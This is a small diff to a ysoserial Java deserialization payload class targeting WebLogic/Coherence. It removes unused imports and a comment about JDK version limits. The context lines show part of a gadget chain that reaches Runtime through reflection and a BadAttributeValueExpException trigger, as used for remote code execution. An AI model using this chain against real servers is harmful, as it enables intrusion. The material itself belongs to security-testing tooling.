@@ -3,15 +3,12 @@ package ysoserial.payloads;
 import com.tangosol.util.extractor.ChainedExtractor;
 import com.tangosol.util.extractor.ReflectionExtractor;
 import com.tangosol.util.filter.LimitFilter;
-import ysoserial.Serializer;
 import ysoserial.payloads.annotation.Dependencies;
 import ysoserial.payloads.annotation.PayloadTest;
 import ysoserial.payloads.util.PayloadRunner;
 
 
 import javax.management.BadAttributeValueExpException;
-import java.io.FileOutputStream;
-import java.io.ObjectOutputStream;
 import java.lang.reflect.Field;
 
 @PayloadTest( precondition = "isApplicableJavaVersion")
@@ -51,10 +48,6 @@ public class WebLogic extends PayloadRunner implements ObjectPayload<Object> {
         Field m_oAnchorTop = limitFilter.getClass().getDeclaredField("m_oAnchorTop");
         m_oAnchorTop.setAccessible(true);
         m_oAnchorTop.set(limitFilter, Runtime.class);
-
-        // BadAttributeValueExpException toString()
-        // This only works in JDK 8u76 and WITHOUT a security manager
-        // https://github.com/JetBrains/jdk8u_jdk/commit/af2361ee2878302012214299036b3a8b4ed36974#diff-f89b1641c408b60efe29ee513b3d22ffR70
         BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
         Field field = badAttributeValueExpException.getClass().getDeclaredField("val");
         field.setAccessible(true);
